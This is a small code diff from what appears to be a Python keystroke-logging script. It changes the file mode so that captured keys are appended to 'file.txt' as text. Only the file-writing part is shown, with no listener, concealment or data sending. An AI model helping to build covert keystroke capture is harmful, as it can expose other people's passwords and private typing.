@@ -19,7 +19,7 @@ def clicked(key):
         keys=[]
 
 def write_file(keys):
-    with open("file.txt", "ab") as f:
+    with open("file.txt", "a") as f:
         for key in keys:
             f.write(str(key))
 
